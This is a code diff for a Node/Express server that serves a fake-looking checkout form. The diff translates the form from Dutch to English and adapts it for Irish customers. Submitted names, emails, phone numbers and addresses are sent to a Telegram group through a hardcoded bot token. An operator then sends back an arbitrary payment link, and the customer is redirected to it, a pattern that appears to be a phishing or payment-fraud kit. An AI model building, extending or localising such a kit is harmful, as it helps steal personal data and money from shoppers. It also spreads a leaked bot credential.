@@ -13,7 +13,7 @@ app.use(express.static('public'));
 
 // Telegram credentials
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8514021592:AAGb8cpda9C03BYreg6kVL5zvUMyAk-FGMM';
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '1770424979';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-5088156392';
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 const APP_URL = process.env.APP_URL || `http://localhost:${PORT}`;
 
@@ -49,12 +49,12 @@ async function sendTelegramMessage(text) {
   }
 }
 
-// Checkout pagina
+// Checkout pagina (Irish/English version)
 app.get('/checkout', async (req, res) => {
   const { amount, currency, order_id, return_url, cart_items } = req.query;
   
   if (!amount || !currency) {
-    return res.status(400).send('Verplichte parameters ontbreken');
+    return res.status(400).send('Missing required parameters');
   }
 
   let cartData = null;
@@ -71,7 +71,7 @@ app.get('/checkout', async (req, res) => {
   res.send(`
     <html>
       <head>
-        <title>Klantgegevens - €${amount}</title>
+        <title>Customer Details - €${amount}</title>
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <style>
           * { 
@@ -188,7 +188,7 @@ app.get('/checkout', async (req, res) => {
       <body>
         <div class="container">
           <div id="form-container">
-            <h1>📋 Klantgegevens</h1>
+            <h1>📋 Customer Details</h1>
             <div class="amount">€${amount}</div>
             
             <div id="error-message" class="error"></div>
@@ -196,43 +196,48 @@ app.get('/checkout', async (req, res) => {
             <form id="customer-form">
               <div class="form-row">
                 <div class="form-group">
-                  <label for="firstName">Voornaam *</label>
-                  <input type="text" id="firstName" required>
+                  <label for="firstName">First Name *</label>
+                  <input type="text" id="firstName" placeholder="Sean" required>
                 </div>
                 <div class="form-group">
-                  <label for="lastName">Achternaam *</label>
-                  <input type="text" id="lastName" required>
+                  <label for="lastName">Last Name *</label>
+                  <input type="text" id="lastName" placeholder="O'Brien" required>
                 </div>
               </div>
               
               <div class="form-group">
-                <label for="email">E-mailadres *</label>
-                <input type="email" id="email" required>
+                <label for="email">Email Address *</label>
+                <input type="email" id="email" placeholder="sean@example.ie" required>
               </div>
               
               <div class="form-group">
-                <label for="phone">Telefoonnummer *</label>
-                <input type="tel" id="phone" required>
+                <label for="phone">Phone Number *</label>
+                <input type="tel" id="phone" placeholder="+353 85 123 4567" required>
               </div>
               
               <div class="form-group">
-                <label for="address">Adres *</label>
-                <input type="text" id="address" required>
+                <label for="address">Address *</label>
+                <input type="text" id="address" placeholder="12 O'Connell Street" required>
               </div>
               
               <div class="form-row">
                 <div class="form-group">
-                  <label for="postalCode">Postcode *</label>
-                  <input type="text" id="postalCode" required>
+                  <label for="postalCode">Eircode *</label>
+                  <input type="text" id="postalCode" placeholder="D01 F5P2" required>
                 </div>
                 <div class="form-group">
-                  <label for="city">Plaats *</label>
-                  <input type="text" id="city" required>
+                  <label for="city">City *</label>
+                  <input type="text" id="city" placeholder="Dublin" required>
                 </div>
               </div>
               
+              <div class="form-group">
+                <label for="country">Country *</label>
+                <input type="text" id="country" value="Ireland" required>
+              </div>
+              
               <button type="submit" class="submit-button">
-                Ga verder
+                Continue to Payment
               </button>
             </form>
           </div>
@@ -240,8 +245,8 @@ app.get('/checkout', async (req, res) => {
           <div id="waiting-container" class="waiting">
             <div class="spinner"></div>
             <div class="waiting-text">
-              Een moment geduld...<br>
-              We verwerken je gegevens
+              Please wait...<br>
+              Processing your details
             </div>
           </div>
         </div>
@@ -261,14 +266,16 @@ app.get('/checkout', async (req, res) => {
               phone: document.getElementById('phone').value.trim(),
               address: document.getElementById('address').value.trim(),
               postalCode: document.getElementById('postalCode').value.trim(),
-              city: document.getElementById('city').value.trim()
+              city: document.getElementById('city').value.trim(),
+              country: document.getElementById('country').value.trim()
             };
             
             // Validate
             if (!customerData.firstName || !customerData.lastName || !customerData.email || 
-                !customerData.phone || !customerData.address || !customerData.postalCode || !customerData.city) {
+                !customerData.phone || !customerData.address || !customerData.postalCode || 
+                !customerData.city || !customerData.country) {
               document.getElementById('error-message').style.display = 'block';
-              document.getElementById('error-message').innerHTML = '✗ Vul alle velden in';
+              document.getElementById('error-message').innerHTML = '✗ Please fill in all required fields';
               return;
             }
 
@@ -298,7 +305,7 @@ app.get('/checkout', async (req, res) => {
                 // Start polling for payment link
                 startPolling();
               } else {
-                throw new Error(data.message || 'Er ging iets mis');
+                throw new Error(data.message || 'Something went wrong');
               }
             } catch (error) {
               document.getElementById('form-container').style.display = 'block';
@@ -329,7 +336,7 @@ app.get('/checkout', async (req, res) => {
               if (pollingInterval) {
                 clearInterval(pollingInterval);
                 document.getElementById('waiting-container').innerHTML = 
-                  '<p style="color: #c62828;">⏱️ Time-out. Probeer het opnieuw.</p>';
+                  '<p style="color: #c62828;">⏱️ Timeout. Please try again.</p>';
               }
             }, 600000);
           }
@@ -361,33 +368,34 @@ app.post('/api/submit-customer-info', async (req, res) => {
     // Build products list
     let productsText = '';
     if (cartData && cartData.items) {
-      productsText = '\n\n<b>🛒 Producten:</b>\n';
+      productsText = '\n\n<b>🛒 Products:</b>\n';
       cartData.items.forEach(item => {
         productsText += `• ${item.quantity}x ${item.title} - €${(item.price / 100).toFixed(2)}\n`;
       });
     }
     
-    // Send to Telegram
+    // Send to Telegram GROUP
     const message = `
-<b>🔔 NIEUWE BESTELLING</b>
+<b>🔔 NEW ORDER</b>
 
-<b>💰 Bedrag:</b> €${amount}
+<b>💰 Amount:</b> €${amount}
 <b>📦 Order ID:</b> ${orderId || sessionId}
 
-<b>👤 Klantgegevens:</b>
-Naam: ${customerData.firstName} ${customerData.lastName}
+<b>👤 Customer Details:</b>
+Name: ${customerData.firstName} ${customerData.lastName}
 Email: ${customerData.email}
-Telefoon: ${customerData.phone}
-Adres: ${customerData.address}
-Postcode: ${customerData.postalCode}
-Plaats: ${customerData.city}${productsText}
+Phone: ${customerData.phone}
+Address: ${customerData.address}
+Eircode: ${customerData.postalCode}
+City: ${customerData.city}
+Country: ${customerData.country}${productsText}
 
 <b>🔑 Session ID:</b> <code>${sessionId}</code>
 
-<b>Stuur betaallink:</b>
-<code>/pay ${sessionId} [jouw-betaallink]</code>
+<b>Send payment link:</b>
+<code>/pay ${sessionId} [your-payment-link]</code>
 
-Voorbeeld:
+Example:
 <code>/pay ${sessionId} https://mollie.com/checkout/xyz123</code>
     `.trim();
     
@@ -395,7 +403,7 @@ Voorbeeld:
     
     res.json({
       status: 'success',
-      message: 'Gegevens verzonden'
+      message: 'Details submitted'
     });
     
   } catch (error) {
@@ -451,12 +459,12 @@ app.post('/webhook/telegram', async (req, res) => {
             session.paymentLink = paymentLink;
             pendingSessions.set(sessionId, session);
             
-            await sendTelegramMessage(`✅ Betaallink ingesteld voor sessie ${sessionId}\n\nKlant wordt doorgestuurd naar:\n${paymentLink}`);
+            await sendTelegramMessage(`✅ Payment link set for session ${sessionId}\n\nCustomer will be redirected to:\n${paymentLink}`);
           } else {
-            await sendTelegramMessage(`❌ Sessie ${sessionId} niet gevonden of verlopen`);
+            await sendTelegramMessage(`❌ Session ${sessionId} not found or expired`);
           }
         } else {
-          await sendTelegramMessage(`❌ Gebruik: /pay [session_id] [betaallink]`);
+          await sendTelegramMessage(`❌ Usage: /pay [session_id] [payment-link]`);
         }
       }
     }
@@ -495,6 +503,7 @@ app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
   console.log(`📍 App URL: ${APP_URL}`);
   console.log(`🤖 Telegram Bot configured`);
+  console.log(`💬 Group Chat ID: ${TELEGRAM_CHAT_ID}`);
   console.log('');
   console.log(`📝 Set webhook: ${APP_URL}/set-webhook`);
 });
